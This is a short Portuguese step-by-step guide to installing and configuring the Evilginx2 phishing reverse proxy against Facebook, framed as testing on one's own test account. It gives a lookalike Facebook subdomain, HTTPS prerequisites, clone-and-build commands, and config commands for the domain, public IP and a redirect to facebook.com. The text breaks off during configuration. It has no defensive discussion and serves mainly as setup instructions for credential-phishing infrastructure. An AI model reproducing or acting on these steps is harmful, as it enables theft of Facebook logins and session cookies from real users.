ETAPAS PARA TESTAR O EVILGINX2 NA SUA CONTA DE TESTE DO FACEBOOK

✅ 1. Pre-requisitos no Kali Linux:

Um dominio proprio (tipo minhapagina.site)

  • Porta 443 (HTTPS) liberada
  • DNS configurado (ex: login.facebook-teste.site apontando para seu IP publico)
  • Certbot instalado (para gerar HTTPS)

    • 🧠 O Evilginx2 so funciona se o site tiver HTTPS valido — caso contrario, o navegador bloqueia.

    ✅ 2. Instalar o Evilginx2

    • sudo apt update
    • sudo apt install git make golang -y
    • git clone https://github.com/kgretzky/evilginx2.git
    • cd evilginx2
    • make
    • sudo ./bin/evilginx

    ✅ 3. Configurar dominio no Evilginx2

    No terminal interativo do Evilginx2:

    • config domain login.seudominio.com
      • config ip 179.222.xxx.xxx # Seu IP público config redirect_url https://facebook.com config site_path /var/www/html/
